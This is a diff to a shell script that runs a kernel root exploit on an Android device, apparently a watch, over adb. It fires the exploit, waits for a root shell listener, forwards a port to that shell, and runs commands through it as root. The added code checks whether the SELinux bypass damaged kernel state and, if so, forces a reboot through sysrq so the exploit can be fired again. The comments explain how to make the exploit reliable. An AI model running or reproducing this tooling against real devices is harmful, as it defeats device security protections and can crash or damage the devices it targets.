@@ -40,13 +40,35 @@ echo "[rootrun] firing ($GS) ..."
 ( nohup $ADB shell "GFSO=$DT/$GS GHOSTLOCK_WS_TARGET=st GHOSTLOCK_STAT_UWALK=1 GHOSTLOCK_ATTEMPTS=44 GHOSTLOCK_WBASE=4 GHOSTLOCK_WALKSAFE=1 GHOSTLOCK_STAY=1 sh $DT/rr.sh" >/dev/null 2>&1 & )
 
 root=0
+unsafe=0
 for i in $(seq 1 20); do
   sleep 5
   # Newest log file ONLY: a panic can poison a log's dentry so `rm -f` cannot
   # delete it, and a stale "SKIP single-flight" line in it then makes a later run
   # misread a perfectly healthy fire as blocked (root.bat attempt 1, 17:14).
   if $ADB shell "cat \$(ls -t $DT/log_*.txt 2>/dev/null | head -1) 2>/dev/null" 2>/dev/null | tr -d '\r' | grep -q 'UW-SHELL listening'; then
-    root=1; echo "[rootrun] ROOT after $((i * 5))s"; break
+    root=1; echo "[rootrun] ROOT after $((i * 5))s"
+    # Is this a root the watch will SURVIVE using? If the permissive punch had to
+    # write 0 (our recycled page was not 64KB aligned) it also cleared
+    # selinux_state.initialized, SID->context dies, and real UI use ends in a
+    # panic. `id -Z` is the direct functional test: resolving a context calls
+    # security_sid_to_context(), so a broken one prints `?` instead of `u:r:...`
+    # -- the same damage that has been showing up as `context=?` in every id
+    # output so far. (A setprop probe is useless: an undefined property name is
+    # rejected by init no matter how healthy SELinux is.) A session that fails is
+    # rebooted through sysrq, because `adb reboot` is itself a property set.
+    $ADB forward tcp:25555 tcp:25555 >/dev/null 2>&1
+    if ! (cd "$ROOT" && python rootcmd.py 25 "echo CTX=[\$(id -Z)]" 2>/dev/null | tr -d '\r' | grep -q 'CTX=\[u:r:'); then
+      unsafe=1
+      echo "[rootrun] UNSAFE root: SID->context is dead (id -Z shows ?), so touching"
+      echo "          the screen will go laggy and then panic. Rebooting for another try"
+      echo "          (a safe fire needs our recycled page to land 64KB aligned)."
+      (cd "$ROOT" && python rootcmd.py 25 "sync; sync; echo b > /proc/sysrq-trigger" >/dev/null 2>&1)
+      root=0
+      break
+    fi
+    echo "[rootrun] SAFE root: id -Z resolves a real context, UI use should hold"
+    break
   fi
 done
 
